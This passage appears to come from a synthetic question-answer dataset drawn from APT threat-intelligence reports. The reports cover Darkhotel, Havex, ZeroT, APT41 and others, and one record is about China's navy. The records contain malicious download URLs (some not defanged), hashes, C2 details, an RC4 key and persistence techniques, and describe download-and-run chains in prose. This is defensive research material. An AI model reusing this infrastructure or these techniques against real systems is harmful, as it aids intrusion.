tools, now owned by \"ThreatTrack Security\".\nBig Headline: Conclusions\nFor the past seven years, a strong threat actor named Darkhotel, also known as Tapaoux, has carried out a number of successful attacks against a wide range of victims from around the world. It employs methods and techniques which go well beyond typical cybercriminal behavior.\nThe Darkhotel crew's skillset allows it to launch interesting cryptographical attacks, for instance factoring 512 bit RSA keys. Its use of 0-days is another indicator of a strong threat actor.\nThe targeting of top executives from various large companies around the world during their stay at certain \"Dark Hotels\" is one of the most interesting aspects of this operation. The exact method of targeting is still unknown - for instance, why some people are targeted while others are not. The fact that most of the time the victims are top executives indicates the attackers have knowledge of their victims whereabouts, including name and place of stay. This paints a dark, dangerous web in which unsuspecting travelers can easily fall. While the exact reason why some hotels function as an attacker vector are unknown, certain suspicions exist, indicating possibly a much larger compromise. We are still investigating this aspect of the operation and will publish more information in the future.\nA further interesting trait is the deployment of multiple types of campaigns, both targeted and botnet. This is becoming more and more common on the APT scene, where targeted attacks are used to compromise high profile victims and botnet style operations are used for massive surveillance or performing other tasks such as launching DDoS attacks on hostile parties or simply upgrading victims to more sophisticated espionage tools.\nWe expect the Darkhotel crew to continue their activities against DIB, Government and NGO sectors. The appendix released with this paper provides technical indicators of compromise which should help victims identify the malicious traffic and enable targets to protect themselves better against attack.\n\nQ: What is the significance of the campaign codes used by the Darkhotel APT, and how are they utilized in the initial C2 communications?",
    "output": "A: The campaign codes or IDs used by the Darkhotel APT are internal identifiers maintained by almost every backdoor in this set. They are used in initial C2 communications. Some IDs appear to be related to geographic interests, while others do not have an obvious pattern. The most common ID is 'DEXT87'. These campaign codes help the attackers organize and track different phases of their operations, although there is no clear pattern of distribution according to connect-back resources. The overlap of internal IDs and C2 resources across components suggests a coordinated effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What criteria does the NetTraveler malware use to determine which files to upload to the C&C server, and why are these criteria important?",
    "output": "The NetTraveler malware uses several criteria to determine which files to upload to the C&C server. First, the file size must not be larger than approximately 10MB (10,485,760 bytes). Second, the file must have one of the extensions from the 'types' option, which includes doc, docx, xls, xlsx, txt, rtf, pdf. These criteria are important because they ensure that only relevant and manageable files are uploaded, avoiding excessive data transfer and focusing on potentially valuable information for the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 10.4. Changing Lights Out exploit sites' download flow\nIn earlier cases (July 2013), successful Java exploitation served from nahoonservices.com would cascade into more Yeti components planted on victim systems. The java exploit in turn downloaded Karagany backdoors, which in turn downloaded stealers from 91.203.6.71:\nUser visits utilico.co.uk \u2192 redirected to \u2192 nahoonservices.com \u2192 Java Exploits \u2192\nwww.nahoonservices.com/wp-content/plugins/rss-poster/start.jar\nwww.nahoonservices.com/wp-content/plugins/rss-poster/juch.php\na615d71af0c856c89bb8ebb5c6e7644d\nfcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915\njuch.php saved as \"searchindexer.exe\", or \"coresyns.exe\" and run, then downloads and runs...\n\u2192 91.203.6.71/check2/muees27jxt/fl.exe\n4bfdda1a5f21d56afdc2060b9ce5a170\n07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4\n\u2192 91.203.6.71/check2/muees27jxt/scs.exe\nda94235635f61a06a35882d30c7b62b3\n05fb04474a3785995508101eca7affd8c89c658f7f9555de6d6d4db40583ac53\nIn a later incident, KSN data recorded one origin of these exploits as:\nhxxp://keeleux.com/sfreg/img/nav/gami.jar and\nhxxp://keeleux.com/sfreg/img/nav/stoh.jar  (ab580bd7a1193fe01855a6b8bd8f456b)\nThe file \"stoh.jar\" includes \"DownloadExec.class\", which maintains a hardcoded string to the URL. This string appears to be more commonly implemented at the active exploit sites:\nhxxp://keeleux.com/sfreg/img/nav/iden21php?dwl=fne\nIt writes out the TmpProvider.dll Havex loader downloaded from this resource and runs it using \"rundll32.exe\".\neWON trojanized installer detail: hxxp://www.ewon.biz/software/eCatcher/eCatcherSetup.exe (eb0dacdc8b346f44c8c370408bad43 06,70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9)\nHavex loader version 038\n(401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67) dropped as TmpProvider.dll.\nMedium Headline: 10.5. Related Targeted Software and CVE Entries\nInternet Explorer\nCVE-2013-1347\n\"Microsoft Internet Explorer 8 does not properly handle objects in memory, which allows remote attackers to execute arbitrary code by accessing an object that (1) was not properly allocated or (2) is deleted, as exploited in the wild in May 2013.\"\nCVE-2012-1889\n\"Microsoft XML Core Services 3.0, 4.0, 5.0, and 6.0 accesses uninitialized memory locations, which allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site.\"\nJava\nCVE-2013-1488\n\"The Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 6 and 7, allows remote attackers to execute arbitrary code via unspecified vectors involving reflection, Libraries, \"improper toString calls,\" and the JDBC driver manager, as demonstrated by James Forshaw during a Pwn2Own competition at CanSecWest 2013.\"\nCVE-2012-1723\n\"Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.\"\nCVE-2012-5076\nUnspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality, integrity, and availability, related to JAX-WS.\nCVE-2013-2465\n\"Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE\n7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D. NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to \"Incorrect image channel verification\" in 2D.\"\nCVE-2013-2423\n\"Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 17 and earlier, and OpenJDK 7, allows remote attackers to affect integrity via unknown vectors related to HotSpot. NOTE: the previous information is from the April 2013 CPU. Oracle has not commented on claims from the original researcher that this vulnerability allows remote attackers to bypass permission checks by the MethodHandles method and modify arbitrary public final fields using reflection and type confusion, as demonstrated using integer and double fields to disable the security manager.\"\nCVE-2012-4681\nMultiple vulnerabilities in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 6 and earlier allow remote attackers to execute arbitrary code via a crafted applet that bypasses SecurityManager restrictions by (1) using com.sun.beans.finder.ClassFinder.findClass and leveraging an exception with the forName method to access restricted classes from arbitrary packages such as sun.awt.SunToolkit, then (2) using \"reflection with a trusted immediate caller\" to leverage the getField method to access and modify private fields, as exploited in the wild in August 2012 using Gondzz.class and Gondvv.class.\nCVE-2013-0422\nMultiple vulnerabilities in Oracle Java 7 before Update 11 allow remote attackers to execute arbitrary code by (1) using the public getMBeanInstantiator method in the JmxMBeanServer class to obtain a reference to a private MBeanInstantiator object, then retrieving arbitrary Class references using the findClass method, and (2) using the Reflection API with recursion in a way that bypasses a security check by the java.lang.invoke.MethodHandles.Lookup.checkSecurityManager method due to the inability of the sun.reflect.Reflection.getCallerClass method to skip frames related to the new reflection API, as exploited in the wild in January 2013, as demonstrated by Blackhole and Nuclear Pack, and a different vulnerability than CVE-2012-4681 and CVE-2012-3174. NOTE: some parties have mapped the recursive Reflection API issue to CVE-2012-3174, but CVE-2012-3174 is for a different vulnerability whose details are not public as of 20130114. CVE-2013-0422 covers both the JMX/MBean and Reflection API issues. NOTE: it was originally reported that Java 6 was also vulnerable, but the reporter has retracted this claim, stating that Java 6 is not exploitable because\nthe relevant code is called in a way that does not bypass security checks. NOTE: as of 20130114, a reliable third party has claimed that the findClass/MBeanInstantiator vector was not fixed in Oracle Java 7 Update 11. If there is still a vulnerable condition, then a separate CVE identifier might be created for the unfixed issue.\nMozilla Firefox\nCVE-2013-1690\n\"Mozilla Firefox before 22.0, Firefox ESR 17.x before 17.0.7, Thunderbird before 17.0.7, and Thunderbird ESR 17.x before 17.0.7 do not properly handle onreadystatechange events in conjunction with page reloading, which allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted web site that triggers an attempt to execute data at an unmapped memory location.\"\nAdobe Reader\nCVE-2010-2883\nStack-based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x before 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a PDF document with a long field in a Smart INdependent Glyphlets (SING) table in a TTF font, as exploited in the wild in September 2010. NOTE: some of these details are obtained from third party information.\nBig Headline: XII. Appendix 12: Previous and parallel research\nENERGY WATERING HOLE ATTACK USED LIGHTSOUT EXPLOIT KIT, Threatpost\nWatering-Hole Attacks Target Energy Sector, Cisco Security\nGlobal Threat Report 2013, Crowdstrike\nTalk2M Incident Report, [30-01-2014], eWON\n\"The eWON commercial website www.ewon.biz has been attacked. A corrupted eCatcherSetup.exe file has been placed into the CMS (Content Management System) of www.ewon.biz website and eCatcher download hyperlinks have been rerouted to this corrupted file.\"\nLightsOut EK: \"By the way... How much is the fish!?\", Malwageddon\nLightsOut EK Targets Energy Sector, Zscalar Threatlab\nAdvisory (ICSA-14-178-01), ICS Focused Malware, ICS-CERT\n\nHow did the Crouching Yeti APT group utilize the 'stoh.jar' file to facilitate the download and execution of malicious payloads, and what role did the 'DownloadExec.class' play in this process?",
    "output": "The Crouching Yeti APT group utilized the 'stoh.jar' file to facilitate the download and execution of malicious payloads. The 'stoh.jar' file contained a class named 'DownloadExec.class', which maintained a hardcoded string to the URL 'hxxp://keeleux.com/sfreg/img/nav/iden21php?dwl=fne'. This URL was used to download the TmpProvider.dll Havex loader. The 'DownloadExec.class' was responsible for writing out the TmpProvider.dll file from this resource and running it using 'rundll32.exe'. This process allowed the attackers to execute the malicious payload on the victim's system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Analysis\nIn this campaign, attackers used a Microsoft Word document called 0721.doc, which exploits CVE-2017-0199. This vulnerability was disclosed and patched days prior to this attack.\nThe document uses the logic flaw to first download the file power.rtf from hxxp://122.9.52[.]215/news/power.rtf. The payload is actually an HTML Application (HTA) file, not an RTF document.\nAs shown in the figure above, the HTA's VBScript changes the window size and location and then uses PowerShell to download yet another script: power.ps1. This is a PowerShell script that downloads and runs the ZeroT payload cgi.exe.\nBig Headline: ZeroT and other payloads\nThe attack group has made incremental changes to ZeroT since our last analysis. While they still use RAR SFX format for the initial payloads, ZeroT now uses a the legitimate McAfee utility (SHA256 3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe) named mcut.exe instead of the Norman Safeground AS for sideloading as they have in the past. The encrypted ZeroT payload, named Mctl.mui, is decoded in memory revealing a similarly tampered PE header and only slightly modified code when compared to ZeroT payloads we analyzed previously.\nOnce ZeroT is running, we observed that the fake User-Agent used in the requests changed from \"Mozilla/6.0 (compatible; MSIE 10.0; Windows NT 6.2; Tzcdrnt/6.0)\" to \"Mozilla/6.0 (compatible; MSIE 11.0; Windows NT 6.2)\", thus removing the \"Tzcdrnt\" typo observed in previous versions. The initial beacon to index.php changed to index.txt but ZeroT still expects an RC4-encrypted response using a static key: \"(*^GF(9042&*\".\nNext, ZeroT uses HTTP beacons to transmit information about the infected system to the command and control (C&C). All posts are encrypted, unlike the last time we analyzed a sample from this actor, when the first POST was (<https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx>)accidentally not encrypted. After that, stage 2 payloads are still retrieved as Bitmap (BMP) images that use Least Significant Bit (LSB) Steganography to hide the real payloads. These images appear normal in image viewers.\nThe stage 2 payload was PlugX that beaconed to C&C servers www[.]icefirebest[.]com and www[.]icekkk[.]net.\nBig Headline: Additional 2017 activity by TA459\nThroughout 2017 we observed this threat actor actively attempting to compromise victims with various malware payloads. ZeroT remained the primary stage 1 payload, but the stage 2 payloads varied. One such interesting example was \"\u041f\u041b\u0410\u041d \u0420\u0415\u0410\u041b\u0418\u0417\u0410\u0426\u0418\u0418 \u041f\u0420\u041e\u0415\u041a\u0422\u0410.rar\" (SHA256 b5c208e4fb8ba255883f771d384ca85566c7be8adcf5c87114a62efb53b73fda). Translated from Russian, this file is named \"PROJECT REALIZATION PLAN\" and contains a compressed .scr executable. This ZeroT executable communicated with the C&C domain www[.]kz-info[.]net and downloaded PlugX as well as an additional PCRat/Gh0st Trojan which communicated with the www[.]ruvim[.]net C&C server. PCRat/Gh0st is a payload that we do not see this group using frequently.\nAnother interesting ZeroT sample (SHA256 bc2246813d7267608e1a80a04dac32da9115a15b1550b0c4842b9d6e2e7de374) contained the executable 0228.exe and a decoy document 0228.doc in the RAR SFX archive. Bundling decoy documents is a common tactic by this group. RAR SFX directives are used to display the decoy while the malicious payload is executed. We suspect that this specific lure was copied from the news article hxxp://www.cis.minsk[.]by/news.php?id=7557. This article was about \"73-\u0433\u043e \u0437\u0430\u0441\u0435\u0434\u0430\u043d\u0438\u044f \u042d\u043a\u043e\u043d\u043e\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u0441\u043e\u0432\u0435\u0442\u0430 \u0421\u041d\u0413\", translated from Russian as \"73rd meeting of the CIS Economic Council\", which describes a meeting held in Moscow by the Commonwealth of Independent States (CIS) countries, an organization that includes nine out of the fifteen former Soviet Republics.\nBig Headline: Conclusion\nTA459 is well-known for targeting organizations in Russia and neighboring countries. However, their strategy, tactics, techniques, and procedures in this particular attack emphasize the importance of rigorous patching regimens for all organizations. Even as software vulnerabilities often take a back seat to human exploits and social\nengineering, robust defenses must include protection at the email gateway, proactive patch management, and thoughtful end user education. Paying attention to the details of past attacks is also an important means of preparing for future attacks. Noting who is targeted, with what malware, and with what types of lures provide clues with which organizations can improve their security posture.\nAt the same time, multinational organizations like the financial services firms targeted here must be acutely aware of the threats from state-sponsored actors working with sophisticated malware to compromise users and networks. Ongoing activity from attack groups like TA459 who consistently target individuals specializing in particular areas of research and expertise further complicate an already difficult security situation for organizations dealing with more traditional malware threats, phishing campaigns, and socially engineered threats every day.\nBig Headline: ET and ETPRO Suricata/Snort Coverage\n2821028 | ETPRO TROJAN APT.ZeroT CnC Beacon HTTP POST\n2825365 | ETPRO TROJAN APT.ZeroT CnC Beacon Fake User-Agent\n2824641 | ETPRO TROJAN APT.ZeroT Receiving Config\n2810326 | ETPRO TROJAN PlugX Related Checkin\n2024196 | ET WEB_CLIENT HTA File containing Wscript.Shell Call - Potential Office Exploit Attempt\n2024197 | ET CURRENT_EVENTS SUSPICIOUS MSXMLHTTP DL of HTA (Observed in RTF 0-day )\n2016922 | ET TROJAN Backdoor family PCRat/Gh0st CnC traffic\n2021716 | ET TROJAN Backdoor family PCRat/Gh0st CnC traffic (OUTBOUND) 102\n\nWhat changes did TA459 make to the ZeroT malware in their latest campaign, and how does it communicate with its command and control (C&C) servers?",
    "output": "TA459 made several changes to the ZeroT malware. They switched from using the Norman Safeground AS to the legitimate McAfee utility, mcut.exe, for sideloading. The encrypted ZeroT payload, named Mctl.mui, was decoded in memory and revealed a tampered PE header with slightly modified code. The fake User-Agent string was updated from 'Mozilla/6.0 (compatible; MSIE 10.0; Windows NT 6.2; Tzcdrnt/6.0)' to 'Mozilla/6.0 (compatible; MSIE 11.0; Windows NT 6.2)', removing the 'Tzcdrnt' typo. ZeroT uses HTTP beacons to transmit encrypted information about the infected system to the C&C. Unlike previous versions, all posts are now encrypted. Stage 2 payloads are retrieved as BMP images using LSB steganography, which appear normal in image viewers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial Discovery and Delivery\nThis investigation began when we identified two malicious Word document files in AutoFocus threat intelligence tool. While we cannot be certain how the documents were sent to the targets, phishing emails are highly likely. One of the malicious files was submitted to VirusTotal on 6 March 2017 with the file name \"\ud55c\uc2f9\uc2dc\uc2a4\ud15c.doc\". Once opened, both files display the same Korean language decoy document which appears to be the benign file located online at \"www.kuipernet.co.kr/sub/kuipernet-setup.docx\".\n\nQ: How did the initial discovery of the Lazarus group's malicious activity begin, and what methods were likely used to deliver the malware? Additionally, describe the nature of the decoy document used in this attack.",
    "output": "A: The initial discovery of the Lazarus group's malicious activity began when two malicious Word document files were identified using the AutoFocus threat intelligence tool. Although the exact delivery method is uncertain, it is highly likely that phishing emails were used. One of the malicious files was submitted to VirusTotal on 6 March 2017 with the file name '\ud55c\uc2f9\uc2dc\uc2a4\ud15c.doc'. Upon opening, both files displayed the same Korean language decoy document, which appeared to be a benign file located online at 'www.kuipernet.co.kr/sub/kuipernet-setup.docx'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Analysis of Project Cobra\nProject Cobra and the Carbon System were mentioned by Kaspersky in the article called \"The Epic Turla Operation\" . This malware is used by the same actors as Uroburos (aka Snake/Turla) and Agent.BTZ. We estimate that Carbon System was developed after Agent.BTZ and before Uroburos. The Carbon System shares some technical details with Uroburos and Agent.BTZ (encryption key, encryption algorithm, design, \u2026) and some other links, such as the name of the snake-related project: Cobra. Uroburos could be considered as a kernel centric \"snake\" and Cobra Carbon System as a userland centric \"snake\".\nOne specification of the group behind this threat is the fact that when they developed new tools, the old ones are not destroyed or abandoned but still maintained and used. Thanks to our collection of samples we are able to draw the following timeline:\nThe Cobra can be considered as an extensible framework. This framework is generally downloaded and dropped by a reconnaissance malware for example Tavdig, aka Wipbot (Symantec) or also (<http://securelist.com/analysis/publications/65545/the-epic-turla-operation/>)Epic Backdoor (Kaspersky). The following schema illustrates the \"modus opandi\" used by the Uroburos actors:\nUsing IOC (Indicators of Compromise) to detect this malware is quite complicated, because the malware authors made efforts to randomize many factors. For example, the attackers drop the malware into different directories, using the files present, also chosen randomly, to store the malware configuration.\nDue to these characteristics, the experts of the G DATA SecurityLabs decided to publish an analysis of the framework dropped by the file with the md5: cb1b68d9971c2353c2d6a8119c49b51f. G DATA security solutions detect this file as Backdoor.TurlaCarbon.A (Engine A) and Win32.Trojan.Cobra.B (Engine B).\nWe can find the compilation path in a file embedded in the dropper:f:\\Workshop\\Projects\\cobra\\carbon_system\\x64\\Release\\carbon_system.pdb\nLooking at this, we can easily identify that \"Carbon System\" is a part of the \"Cobra\" project.\nRead the text above and answer this question: How does the Carbon System, associated with Project Cobra, differ from Uroburos in terms of its operational focus, and what implications does this have for detection and mitigation strategies?",
    "output": "The Carbon System, part of Project Cobra, differs from Uroburos primarily in its operational focus. While Uroburos is described as a 'kernel centric snake,' focusing on kernel-level operations, the Carbon System is characterized as a 'userland centric snake.' This means that the Carbon System operates mainly within the user space of the operating system, interacting with applications and processes at a higher level compared to Uroburos' deeper, kernel-level activities. This distinction has significant implications for detection and mitigation strategies. Userland-focused malware like the Carbon System might be easier to detect through behavioral analysis and monitoring of application-level activities. However, it also means that traditional anti-virus solutions and user-space monitoring tools must be particularly vigilant and capable of identifying anomalous behaviors. Conversely, kernel-level malware like Uroburos requires more sophisticated detection methods, such as rootkit scanners and advanced endpoint protection solutions that can monitor and protect the system at a lower level.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summary\nAfter creating and using a new exitmap module, I found downloaded binaries being patched through a Tor exit node in Russia. Tor is a wonderful tool for protecting the identity of journalists, their sources, and even regular users around the world; however, anonymity does not guarantee security.\nAt DerbyCon this year I gave a (<http://www.youtube.com/watch?v=LjUN9MACaTs>)presentation of my binary patching framework, (<https://github.com/secretsquirrel/the-backdoor-factory>)BDF. Many binaries are hosted without any transport layer security encryption. Some binaries are signed to prevent modification, but most are not. During that presentation, I talked about the MITM patching of binaries during download, and showed how easy it was using (<https://github.com/secretsquirrel/BDFProxy>)BDFProxy. I also mentioned that similar techniques are probably already in use on the Internet.\nI had only circumstantial evidence until recently.\nRead the text above and answer this question: In the context of the APT report 'Modified_Binaries_Tor', how does the lack of transport layer security encryption and the absence of binary signing contribute to the vulnerability of downloaded binaries to MITM patching? Explain the role of tools like BDFProxy in exploiting these weaknesses.",
    "output": "The lack of transport layer security encryption means that data transmitted over the network is not encrypted, making it susceptible to interception and modification by malicious actors. Additionally, many binaries are not signed, which means there is no mechanism to verify their integrity and authenticity. This combination allows attackers to perform Man-in-the-Middle (MITM) patching, where they can intercept and modify binaries during download. Tools like BDFProxy facilitate this process by providing a framework for easily patching binaries in transit. During a presentation at DerbyCon, it was demonstrated how simple it is to use BDFProxy to patch binaries during download, highlighting the ease with which these vulnerabilities can be exploited.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Persistence\nAPT41 continues to leverage advanced tradecraft to remain persistent and undetected. In multiple instances, the Windows version of the KEYPLUG backdoor leveraged (<https://attack.mitre.org/techniques/T1102/001/>)dead drop resolvers on two separate tech community forums. The malware fetches its true C2 address from encoded data on a specific forum post. Notably, APT41 continues to update the community forum posts frequently with new dead drop resolvers during the campaign. APT41 has historically used this unique tradecraft during other intrusions to help keep their C2 infrastructure hidden.\nTo persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the context of SYSTEM. APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10.\nAPT41 has leveraged the following Windows scheduled tasks for persistence of DEADEYE droppers in U.S. state government intrusions:\n\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\n\\Microsoft\\Windows\\Ras\\ManagerMobility\n\\Microsoft\\Windows\\WDI\\SrvSetupResults\n\\Microsoft\\Windows\\WDI\\USOShared\nAnother technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate Windows PE binaries. As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint. A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.\nAPT41 continues to tailor their malware to victim environments through their stealthy passive backdoor . During one intrusion, APT41 exploited a USAHerds server and subsequently executed DEADEYE.APPEND which dropped LOWKEY.PASSIVE in-memory. The identified LOWKEY.PASSIVE sample listened for incoming connections that request either of the following URL endpoints:\nhttp://<HOST:PORT>/USAHerds/Common/%s.css\nhttps://<HOST:PORT>/USAHerds/Common/%s.css\nAPT41 frequently configured LOWKEY.PASSIVE URL endpoints to masquerade as normal web application traffic on an infected server.\nQuestion: How does APT41 leverage dead drop resolvers to maintain persistence and evade detection in their campaigns, and what specific techniques do they employ to execute and hide their malware?",
    "output": "Answer: APT41 uses dead drop resolvers on tech community forums to fetch the true Command and Control (C2) addresses for their KEYPLUG backdoor. They frequently update these forum posts with new dead drop resolvers to keep their C2 infrastructure hidden. For persistence, APT41 modifies existing scheduled tasks using the 'schtasks /change' command to run under the context of SYSTEM. They often use the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA for binary execution. Specific scheduled tasks leveraged include \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared. Additionally, APT41 adds malicious imports to the Import Address Table (IAT) of legitimate Windows PE binaries, causing the legitimate binary to load the malicious library upon execution. They also tailor their malware to victim environments, such as exploiting a USAHerds server to execute DEADEYE.APPEND, which drops LOWKEY.PASSIVE in-memory. LOWKEY.PASSIVE listens for incoming connections on specific URL endpoints designed to mimic normal web application traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Navy\nThe People's Liberation Army Navy (PLAN) is composed of 250,000 personnel divided into three major fleets, the North Sea Fleet, East Sea Fleet, and South Sea Fleet, each containing surface ships, submarines, naval air force, coastal defence, and marine units. China's naval force includes 57 attack submarines, 55 medium and heavy amphibious ships, and 49 coastal missile patrol craft. A priority has been placed on anti-air capabilities with improvements in over-the-horizon targeting, range, and accuracy in surface-to-air missiles. \"Taking informationization as the goal and strategic focus in its modernization drive, the Navy gives high priority to the development of maritime information systems, and new-generation weaponry and equipment\" (China's National Defense in 2006). As a part of PLAN's modernization program, PLAN has been developing blue water navy capabilities.\nPLAN does not currently have an aircraft carrier. However, evidence suggests they are pursing such technology and have the capability to construct one. Renovation to a former Soviet Kuznetsov-class aircraft carrier may be used for training purposes, and the Chinese have expressed interest in acquiring Russian Su-33 carrier-borne fighters. The ex-Australian carrier Melbourne also provided research for the PLAN as it was towed to China for scrap. Russian assistance, coupled with an already capable ship building infrastructure, could allow PLAN to rapidly develop an aircraft carrier. The PLAN's ambitions include operating out to the first and second island chains, extending operations to the South Pacific near Australia, north to the Aleutian Islands, and west to the Strait of Malacca towards the Indian Ocean (Annual Report to Congress 2008).\nChina's submarine fleet is derived from outdated Russian technology and is seeking to become a more modern and smaller force. Early Chinese submarines were domestically produced versions of the Soviet Romeo class submarine, which were only capable of coastal patrols with deployment to sea limited to a few days per year. One Romeo was modified to carry six YJ-1 (C-801) anti-ship missiles, but it had to surface to fire them. The Chinese Ming class submarines produced in the 1970s were not much better, other than being of newer construction. This was followed by the Song class submarine, which had a streamlined hull and can be fitted with anti-ship missiles capable of being fired while submerged. China returned to purchasing subs in the late 1990s with the Russian Kilo class submarine. The Type 041 Yuan Class is the newest diesel-electric submarine in the PLAN.  Its design incorporates parts of the Song class and Russian Kilo class submarines. The Yuan class has five torpedo tubes capable of launching indigenous torpedos as well as Russian\ndesigned torpedos, and it is believed to have anti-ship missiles. This ship was designed to replace the aging Romeo and Ming class submarines which currently form the backbone of the PLAN's submarine fleet (Chinese Submarines 2008; see also China's Navy 2007).\nChinese produced Han class nuclear submarines were plagued with problems. A follow-on Type 093 nuclear submarine was developed with experience from the Han class and further assistance from Russian submarine builders, such as advanced wielding and construction techniques. Despite being armed with new Chinese wire-guided torpedoes; the Type 093's overall capability remains comparable to Russian technology of the late 1970s. Nevertheless, China continues to make progress and the true level of Russian assistance lacks transparency (Smith 2001). Further, the Type 093 may have benefited from German fuel cell technology and French design, which could allow for two to three weeks of submerged operations without having to surface to recharge batteries. Internet-source photos of Type 039s under construction also show Chinese mastery of advanced multi-layer rubber/polymer hull coatings that greatly reduce hull-radiated noise while limiting the effectiveness of active-sonar detection (Chinese Submarines 2008).\nChina maintains a fleet of approximately 28 destroyers, 48 frigates, and 30 ocean-capable fast attack craft. The frigates were designed for anti-surface warfare, and lacking significant self-defence. Chinese-built destroyers include the Luhu class, the Luhai class, and the Luda I/II/III, from oldest to newest, respectively. The Luhai and Luda class are armed with a battery of guns, torpedos, mortars, optional helicopter pads, and domestically built Crotale SAMs which were built from designs provided by France in the 1980s. Construction of the Luhai class was delayed from the mid 1980s to the mid 1990s due to construction of frigates for the Thai Navy. The most powerful addition to the PLAN is the Russian-built Sovremenny class destroyers. These include MOSKIT anti-ship missiles and KASHTAN combined gun/missile ship defence systems. While these designs are non-stealth 1970s Russian technology, outdated by current designs, they provided the PLAN with modern anti-ship, anti-air, and anti-submarine systems. The most recent Sovremenny acquisitions carry 8 Sunburn supersonic sea-skimming ASM and the SA-N-7 Gadfly, which will give PLAN limited naval air-defence capability. Up to this point, China only possessed short-range SAMs of French or domestic design (Surface Combatants 2008; IISS 2008).\nImprovements in stealth design of the PLAN's ships further the notion that China seeks to modernize by purchasing or clandestinely obtaining technology from other states, reverse engineering that technology, and then attempting to make upgraded domestically produced versions.  According to Frank Moore of the Institute for Defence and Disarmament Studies:\nThe PLA developed new stealthy warships benefiting from Russian or Ukrainian design advice, weapons, electronics and other systems, plus new computer aided design methods which speeded their development. By 2002 it was possible to observe the construction of three new classes of warships via Chinese internet sources ... the No. 168 class, which armed with Russian SHTIL SAMs, Russian radar, Kamov Ka-28 ASW helicopters and Chinese C-802/803 anti-ship missiles, and powered by Ukrainian gas turbine engines. Soon after two No. 170 class destroyers were launched. These featured large phased array radar similar in appearance to the U.S. AEGIS system... Most likely the new \"AEGIS\" radar comes from the Ukrainian KVANT bureau and is a newly-developed active phased array radar with a broad search range of about 150km ... In 2003 [PLAN] launched two Type 054 stealthy frigates. Some sources indicate production was halted at two ships pending the completion of a new Russian SAM... In early 2004 internet-source pictures of a model of this new variant, apparently from a Chinese shipbuilding exhibition, confirmed that it will feature a new vertical-launched SAM and be outfitted with Russian radar and missile guidance systems. The Type 054 is also powered by co-produced French-designed SEMT Pielstick marine diesel engines.\nA fourth stealthy warship emerged in April 2004: a new fast-attack craft (FAC). Now being produced at two or three shipyards, this new FAC utilizes a wave-piercing catamaran (twin) hull design, which improves stability at high speeds even in rough seas. It is based on a design obtained from the Australian fast-ferry firm AMD... [with] radar-absorbing materials applied to the hull. (Moore 2000).\nNot only does this illustrate China's use of foreign technology, it also demonstrates the complexity of modern warfare. These are highly sophisticated weapons, weapons pieced together from multiple sources, the existence of which was leaked onto the internet.\n\nQ: How does the People's Liberation Army Navy (PLAN) aim to modernize its capabilities, and what specific technologies and strategies are being employed to achieve this goal?",
